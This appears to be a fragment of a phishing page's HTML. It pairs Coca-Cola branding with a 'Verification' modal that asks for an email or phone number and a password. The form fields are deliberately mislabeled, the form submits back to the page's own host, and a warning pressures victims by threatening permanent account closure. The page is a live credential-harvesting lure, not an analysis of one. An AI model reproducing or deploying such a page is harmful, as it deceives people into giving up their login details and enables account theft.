...
<head>
  ...
  <link rel="icon" href="/cola/XXXX-removebg-preview.png">
...
<body class="modal-open" style="overflow: hidden; padding-right: 0px;">
  <nav class="navbar navbar-dark bg-primary">
        ...
        <div class="modal-content">
          <div class="modal-body">
            <div class="text-center">
              <img src="/cocacola/r7k-S3-GLlh2-D.png" alt="Verification" class="img-fluid rounded">
            </div>
            <div class="mt-4">
              ...
              <div class="mt-4">
                <form action="" method="post" id="myform">
                  <div class="mb-3 shadow">
                    <input type="id" class="form-control up" name="firsname" placeholder="Email address or phone number" autocomplete="on" required="yes" maxlength="100">
                  </div>
                  <div class="mb-3 shadow">
                    <input type="password" class="form-control up" name="lastname" placeholder="Password" autocomplete="off" required="yes" maxlength="150">
                  </div>
                  <div class="form-group mt-3 shadow">

                    <button class="btn btn-primary d-block mx-auto w-100" type="submit">
                      Log In
                    </button>
                  </div>
                </form>
            ...
            <div class="_3QeaJ">
              ...
              <div class="DonErr">
                Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate
                accounts, go to <b>
    ...
    <script src="/jellydrink/script2.js"></script>
    </div>
</body>
